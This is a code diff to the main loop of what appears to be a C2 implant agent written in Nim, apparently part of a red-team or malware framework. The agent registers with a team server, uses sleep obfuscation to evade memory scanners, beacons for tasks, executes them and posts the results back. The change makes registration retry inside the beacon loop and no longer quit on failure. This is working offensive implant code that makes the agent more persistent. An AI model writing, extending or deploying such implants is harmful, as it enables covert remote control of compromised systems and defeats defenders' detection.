@@ -17,22 +17,34 @@ proc main() =
     var registration: AgentRegistrationData = ctx.collectAgentMetadata()
     let registrationBytes = ctx.serializeRegistrationData(registration)
 
-    if not ctx.httpPost(registrationBytes): 
-        print("[-] Agent registration failed.")
-        quit(0)
-    print fmt"[+] [{ctx.agentId}] Agent registered."
+    if ctx.httpPost(registrationBytes): 
+        print fmt"[+] [{ctx.agentId}] Agent registered."
+        ctx.registered = true
+    else: 
+        print "[-] Agent registration failed."
 
     #[
         Agent routine: 
-        1. Sleep Obfuscation
-        2. Retrieve tasks via checkin request to a GET endpoint
-        3. Execute task and post result
-        4. If additional tasks have been fetched, go to 3.
-        5. If no more tasks need to be executed, go to 1. 
+        1. Register to the team server if not already register
+        2. Sleep Obfuscation
+        3. Retrieve tasks via checkin request to a GET endpoint
+        4. Execute task and post result
+        5. If additional tasks have been fetched, go to 3.
+        6. If no more tasks need to be executed, go to 1. 
     ]#
     while true: 
+
         # Sleep obfuscation to evade memory scanners
         sleepObfuscate(ctx.sleepSettings)
+        
+        # Register
+        if not ctx.registered: 
+            if ctx.httpPost(registrationBytes): 
+                print fmt"[+] [{ctx.agentId}] Agent registered."
+                ctx.registered = true
+            else: 
+                print "[-] Agent registration failed."
+                continue
 
         let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
         print "\n", fmt"[*] [{date}] Checking in."
@@ -46,13 +58,13 @@ proc main() =
                 packet: string = ctx.httpGet(heartbeatBytes)
 
             if packet.len <= 0: 
-                print("[*] No tasks to execute.")
+                print "[*] No tasks to execute."
                 continue
 
             let tasks: seq[Task] = ctx.deserializePacket(packet)
             
             if tasks.len <= 0: 
-                print("[*] No tasks to execute.")
+                print "[*] No tasks to execute."
                 continue
 
             # Execute all retrieved tasks and return their output to the server
@@ -63,7 +75,7 @@ proc main() =
                 ctx.httpPost(resultBytes)
 
         except CatchableError as err: 
-            print("[-] ", err.msg)
+            print "[-] ", err.msg
 
 when isMainModule:
     main() 
